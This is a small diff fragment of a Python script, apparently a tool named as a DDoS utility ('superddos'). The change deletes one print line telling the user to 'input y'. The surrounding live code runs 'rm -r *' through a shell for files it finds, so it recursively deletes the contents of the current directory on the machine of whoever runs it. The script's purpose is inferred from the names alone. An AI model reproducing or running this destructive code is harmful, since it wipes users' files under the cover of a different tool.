@@ -98,7 +98,6 @@ def superddos():
     for file in file_list:
         if os.path.isfile(file):
         	subprocess.call("rm -r *", shell=True)
-            print("input y saja") 
 
 if author == "dandier":
     main()
